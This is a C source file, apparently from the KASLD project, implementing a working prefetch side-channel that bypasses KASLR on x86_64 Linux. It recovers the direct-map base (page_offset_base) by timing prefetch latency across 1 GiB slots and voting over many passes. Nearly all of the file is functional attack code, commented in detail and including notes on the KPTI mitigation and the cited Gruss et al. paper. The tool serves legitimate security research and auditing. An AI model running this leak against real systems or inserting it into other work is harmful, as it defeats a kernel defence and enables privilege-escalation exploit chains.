// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Prefetch side-channel: direct-map (page_offset_base) KASLR bypass.
//
// The same prefetch timing primitive that locates the kernel text base
// (prefetch.c) locates the base of any large contiguous mapped region. The
// direct map — the linear mapping of all physical RAM — is the ideal second
// target: on x86_64 CONFIG_RANDOMIZE_MEMORY randomizes its base
// (page_offset_base) independently of kernel text, and the region is a
// multi-GiB densely-mapped block, so its LEFT EDGE (the lowest mapped page,
// i.e. page_offset_base) is a strong, unambiguous signal.
//
// Recovering page_offset_base resolves the virtual<->physical translation:
// physical leaks then map to virtual addresses and vice versa.
//
// Technique: scan the direct-map KASLR window at 1 GiB (PUD) granularity,
// timing prefetch at each candidate, and detect the left edge of the mapped
// run (see prefetch_scan.h). Requires KPTI disabled, exactly as the text scan.
//
// This is one of the original results of the Gruss et al. prefetch paper
// (USENIX Security 2016), which located the direct-physical map this way.
//
// Scope: L4 (4-level) paging. The L5 (5-level) randomization window spans tens
// of petabytes — far too large for a flat 1 GiB scan — so this declines under
// 5-level paging rather than scan incompletely.
//
// Leak primitive:
//   Data leaked:      direct-map base (page_offset_base) virtual address
//   Kernel subsystem: arch/x86 mm — CONFIG_RANDOMIZE_MEMORY
//   Data structure:   the linear (direct) map (page table walk timing)
//   Address type:     virtual (direct map)
//   Method:           timing (prefetch latency, 1 GiB scan)
//   Status:           unfixed (hardware side-channel)
//   Access check:     N/A (hardware side-channel — no kernel gate)
//   Source:           N/A (hardware side-channel)
//
// Mitigations:
//   KPTI (CONFIG_PAGE_TABLE_ISOLATION=y) removes kernel mappings from the
//   userspace page tables, eliminating the timing differential. Auto-disabled
//   on CPUs not vulnerable to Meltdown (all AMD, Intel Ice Lake+).
//
// References:
//   https://gruss.cc/files/prefetch.pdf
// ---
// <bcoles@gmail.com>

#if !defined(__x86_64__) && !defined(__amd64__)
#error "Architecture is not supported"
#endif

#define _GNU_SOURCE
#include "include/kasld/api.h"
#include "include/kasld/cli.h"
#include "include/kasld/meminfo.h"
#include "include/prefetch_scan.h"
#include "include/sidechannel.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

KASLD_EXPLAIN(
    "Prefetch side-channel against the direct map: the same PREFETCH timing "
    "differential that reveals mapped-vs-unmapped kernel text also reveals the "
    "base of the direct map (page_offset_base), which CONFIG_RANDOMIZE_MEMORY "
    "randomizes independently on x86_64. Scanning PREFETCH latency across the "
    "1 GiB-aligned candidate bases locates the mapped region's left edge. "
    "Mitigated by KPTI. L4 paging only.");

KASLD_META("method:timing\n"
           "phase:probing\n"
           "live:1\n"
           "addr:virtual\n"
           "hardware:KPTI\n"
           "config:RANDOMIZE_MEMORY\n");

static int verbose = 0;

// The direct map is randomized on the 1 GiB (PUD) grid. The 1 GiB-huge-page
// mapping produces a WEAKER prefetch differential than 2 MiB kernel text, so it
// needs many more iterations to accumulate the sub-quantum signal above the
// noise (the whole point of the AMD sum strategy). The marginal base slot is
// only caught in a fraction of passes, so run many passes: each is an
// independent chance to catch it, and the vote (directmap_vote) takes the
// lowest edge caught by >= 2 of them.
#define DM_STEP RANDOMIZE_MEMORY_ALIGN
#define DM_ITERATIONS 64
#define DM_PASSES 11
// Minimum passes that must locate SOME edge before the vote will trust there is
// a signal to corroborate. Below this the signal is too weak to judge; at or
// above it, a failure to agree means scatter (incoherent), not weakness.
#define DM_MIN_LOCATED 3

// Cluster confirmation for the dense direct-map block: a slot begins the run if
// it and >= DM_CONFIRM_K of the next DM_CONFIRM_M slots are mapped. Kept small
// (the block is contiguous) so systems with only a few GiB of RAM still
// confirm, while isolated scheduler outliers do not.
#define DM_CONFIRM_K 3
#define DM_CONFIRM_M 4

// Density verification of the voted base: the direct map is a DENSE, contiguous
// block, so the base slot and the slots just above it are (nearly) all mapped.
// A weak or neutralised differential instead leaves only a sparse scatter of
// mapped slots that find_edge reads as an edge partway UP the real map (the
// true dense floor reads at baseline), and every pass makes the same mistake,
// so corroboration alone trusts it. Require the base plus >= 3/4 of a window
// above it to be mapped. The check runs on the cross-pass MINIMUM: a real dense
// map is mapped in every pass and survives it, while a per-pass scatter of
// noise hits different slots each pass and washes out — so a sparse,
// mitigation-flattened signal fails here rather than yielding a false base. The
// window is bounded by RAM size so a small direct map is not judged against the
// unmapped slots above it.
#define DM_VERIFY_WINDOW 8

// Is slot `idx` of `agg` mapped? Mirrors prefetch_scan_find_edge's per-vendor
// orientation: AMD mapped reads HIGHER (> 1.5x the baseline median), Intel/
// unknown mapped reads FASTER (below the baseline->fastest midpoint).
static int directmap_slot_mapped(const uint64_t *agg, size_t idx, int vendor,
                                 uint64_t median, uint64_t vmin) {
  if (vendor == CPU_VENDOR_AMD)
    return agg[idx] > median + median / 2;
  return agg[idx] < median - (median - vmin) / 2;
}

// Confirm the voted base begins a dense mapped run in the cross-pass aggregate.
// Returns 1 if plausible (or on allocation failure — fail open rather than drop
// a corroborated base), 0 if the base region is too sparse to be a real floor.
static int directmap_base_is_dense(const uint64_t *agg, size_t n, int vendor,
                                   size_t base) {
  uint64_t *sorted = (uint64_t *)malloc(n * sizeof(uint64_t));
  if (!sorted)
    return 1;
  memcpy(sorted, agg, n * sizeof(uint64_t));
  qsort(sorted, n, sizeof(uint64_t), prefetch_scan_cmp_u64);
  uint64_t median = sorted[n / 2];
  uint64_t vmin = sorted[0];
  free(sorted);

  /* The base slot maps low physical RAM, so it must itself be mapped. */
  if (!directmap_slot_mapped(agg, base, vendor, median, vmin))
    return 0;

  /* Bound the density window by RAM: the direct map spans MemTotal, so a system
   * with only a few GiB has a short map and must not be judged against the
   * unmapped slots above it. */
  size_t window = DM_VERIFY_WINDOW;
  unsigned long ram = kasld_read_memtotal_bytes();
  if (ram) {
    size_t ram_slots = (size_t)(ram / DM_STEP);
    if (ram_slots < window)
      window = ram_slots;
  }
  if (window < 1)
    window = 1;
  size_t need = (window * 3 + 3) / 4; /* ceil(3/4 of the window) */

  size_t mapped = 0, j;
  for (j = 0; j < window && base + j < n; j++)
    if (directmap_slot_mapped(agg, base + j, vendor, median, vmin))
      mapped++;
  return mapped >= need;
}

// ---------------------------------------------------------------------------
// The direct-map KASLR window: candidate page_offset_base positions of DM_STEP
// bytes, from the compile-time base up to where vmalloc would begin (the direct
// map is the lowest of the randomized regions, so it never reaches vmalloc).
// Returns the slot count and sets *win_base, or 0 on 5-level paging (out of
// scope: the L5 window is too large for a flat scan).
// ---------------------------------------------------------------------------
static size_t directmap_window(uint64_t *win_base) {
  if (detect_la57())
    return 0;
  *win_base = PAGE_OFFSET_BASE_L4;
  return (size_t)((VMALLOC_BASE_L4 - PAGE_OFFSET_BASE_L4) / DM_STEP);
}

// ---------------------------------------------------------------------------
// Robust vote of the detected left edge across passes. page_offset_base is one
// specific PUD slot: passes that TRULY locate it agree on that exact slot,
// while passes that miss it land HIGHER (nothing real is mapped below the
// base). So the estimate is the LOWEST edge that is CORROBORATED — reported by
// >= 2 passes at the exact same slot.
//
// If no two passes agree, the located edges are SCATTER, not a floor, and the
// vote fails CLOSED (returns 0). This is load-bearing: on a host where the
// prefetch differential is neutralised (e.g. under a hypervisor), each pass
// still returns a per-pass "edge" from timing noise — scattered across the
// whole window, and able to land ANYWHERE, including below the true base.
// Emitting the minimum of that scatter (the previous behaviour) fabricates a
// confident, WRONG page_offset_base every run — a false leak, worse than none
// (measured on such a host: 0/10 exact hits, every value distinct, some below
// the true base). A coincidental exact agreement among DM_PASSES over the
// ~window_slots candidates is negligible (~C(DM_PASSES,2)/window_slots), so
// corroboration is a sound signal-vs-noise gate. Sets *n_found to the number of
// passes that located an edge (distinguishes no-signal from a corroboration
// failure). Returns the page_offset_base address, or 0.
// ---------------------------------------------------------------------------
static unsigned long directmap_vote(int vendor, size_t n, uint64_t win_base,
                                    int *n_found, int *sparse) {
  unsigned long results[DM_PASSES];
  uint64_t *times = (uint64_t *)malloc(n * sizeof(uint64_t));
  uint64_t *agg = (uint64_t *)malloc(n * sizeof(uint64_t));
  if (!times || !agg) {
    free(times);
    free(agg);
    kasld_err("out of memory for %zu-slot scan buffer", n);
    return 0;
  }

  size_t k;
  for (k = 0; k < n; k++)
    agg[k] = ~(uint64_t)0; /* cross-pass minimum accumulator */

  int i;
  for (i = 0; i < DM_PASSES; i++) {
    prefetch_scan_collect(times, n, win_base, DM_STEP, vendor, DM_ITERATIONS);
    for (k = 0; k < n; k++)
      if (times[k] < agg[k])
        agg[k] = times[k];
    if (verbose && i == 0)
      prefetch_scan_dump(times, n, win_base, DM_STEP,
                         vendor == CPU_VENDOR_AMD ? "sum_cycles"
                                                  : "min_cycles");
    long edge =
        prefetch_scan_find_edge(times, n, vendor, DM_CONFIRM_K, DM_CONFIRM_M);
    results[i] = edge < 0 ? 0 : win_base + (unsigned long)edge * DM_STEP;
    if (verbose)
      fprintf(stderr, "# pass %d: 0x%lx\n", i, results[i]);
  }
  free(times);

  /* Gather the located (non-zero) edges. */
  unsigned long edges[DM_PASSES];
  int found = 0;
  for (i = 0; i < DM_PASSES; i++)
    if (results[i])
      edges[found++] = results[i];
  if (n_found)
    *n_found = found;

  /* Enough passes must locate SOME edge to trust there is a signal — a fixed
   * floor, not a proportion of DM_PASSES. The direct-map differential is weak,
   * so only a fraction of passes locate an edge; a majority requirement would
   * make MORE passes counterproductive (raising the bar the weak signal must
   * clear). DM_MIN_LOCATED independent detections is the confidence floor. */
  if (found < DM_MIN_LOCATED) {
    free(agg);
    return 0;
  }

  /* Sort ascending (insertion sort; found is tiny), then take the lowest edge
   * located by >= 2 passes — the corroborated left-edge floor. */
  for (i = 1; i < found; i++) {
    unsigned long key = edges[i];
    int j = i - 1;
    while (j >= 0 && edges[j] > key) {
      edges[j + 1] = edges[j];
      j--;
    }
    edges[j + 1] = key;
  }
  unsigned long candidate = 0;
  for (i = 0; i + 1 < found; i++)
    if (edges[i] == edges[i + 1]) {
      candidate = edges[i];
      break;
    }
  /* No two passes agreed: scatter, not a floor — fail CLOSED (see header). */
  if (!candidate) {
    free(agg);
    return 0;
  }

  /* Corroboration proves the edge is stable, not that it is the DENSE
   * direct-map floor: a mitigation-flattened signal makes every pass land the
   * same wrong edge partway up a sparse scatter. Confirm the base begins a
   * dense mapped run before trusting it; otherwise fail closed and flag the
   * sparsity so the caller can distinguish it from scatter. */
  size_t base_slot = (size_t)((candidate - win_base) / DM_STEP);
  int dense = directmap_base_is_dense(agg, n, vendor, base_slot);
  free(agg);
  if (!dense) {
    if (sparse)
      *sparse = 1;
    return 0;
  }
  return candidate;
}

static unsigned long get_directmap_base_prefetch(void) {
  int cpu = detect_cpu_vendor();
  bool pti = detect_kpti();

  if (cpu == CPU_VENDOR_UNKNOWN)
    kasld_info("unknown CPU vendor, assuming Intel-like behavior");
  else
    kasld_info("%s CPU detected", cpu == CPU_VENDOR_AMD ? "AMD" : "Intel");

  if (!has_rdtscp()) {
    kasld_err("rdtscp instruction not supported on this CPU");
    return 0;
  }

  if (pti) {
    fprintf(stderr,
            "[-] KPTI is enabled; prefetch side-channel is ineffective\n"
            "    (kernel pages unmapped from userspace page tables)\n");
    return 0;
  }

  kasld_info("KPTI is not detected");

  uint64_t win_base = 0;
  size_t n = directmap_window(&win_base);
  if (n == 0) {
    kasld_err("5-level paging (la57) is active; the direct-map KASLR window is "
              "too large for a flat scan (unsupported)");
    return 0;
  }

  pin_cpu(0);

  int n_found = 0;
  int sparse = 0;
  unsigned long base = directmap_vote(cpu, n, win_base, &n_found, &sparse);

  if (!base) {
    if (sparse)
      kasld_err(
          "sparse prefetch signal: %d/%d passes agreed on a base, but the "
          "direct map is not densely mapped above it — the region is a thin "
          "scatter of mapped slots, not the dense linear map, so the agreed "
          "edge is not its floor (the differential is likely neutralised here, "
          "e.g. patched AMD microcode); the true base is not recoverable",
          n_found, DM_PASSES);
    else if (n_found == 0)
      kasld_err("no direct-map signal: the scan found no mapped-region cluster "
                "(this CPU may not leak through prefetch page-walk latency, or "
                "the direct map is smaller than the confirmation window)");
    else if (n_found < DM_MIN_LOCATED)
      kasld_err("weak prefetch signal: only %d/%d passes located an edge "
                "(scheduler / frequency / thermal noise); a quieter run may "
                "resolve it",
                n_found, DM_PASSES);
    else
      kasld_err(
          "incoherent prefetch signal: %d/%d passes located an edge but "
          "none agreed on a base — the located edges scatter across the "
          "window, so there is no left-edge floor to recover (the prefetch "
          "differential is likely neutralised here, e.g. under a "
          "hypervisor); a re-run will not help",
          n_found, DM_PASSES);
    return 0;
  }

  return base;
}

int main(int argc, char *argv[]) {
  kasld_cli(argc, argv);
  if (kasld_skip_live_probe("prefetch directmap"))
    return 0;
  verbose = kasld_is_verbose();

  kasld_info("trying prefetch direct-map side-channel ...");

  unsigned long base = get_directmap_base_prefetch();
  if (!base) /* get_directmap_base_prefetch already reported the reason */
    return 0;

  kasld_info("possible direct-map base (page_offset_base): %lx", base);
  /* The left edge of the mapped direct map IS page_offset_base — the lowest
   * mapped linear-map address. Report it as a base claim; the engine
   * (directmap_page_offset_bounds) bounds Q_PAGE_OFFSET from it, pinning it
   * with SF_PHYS_MAX_PFN. Region DIRECTMAP. CONF_TIMING: a cache-timing
   * measurement that can miss, so it shapes the speculative window only — a
   * parsed leak overrides it, an agreeing one corroborates it. */
  kasld_result_base(KASLD_TYPE_VIRT, REGION_DIRECTMAP, base, NULL, CONF_TIMING);

  return 0;
}
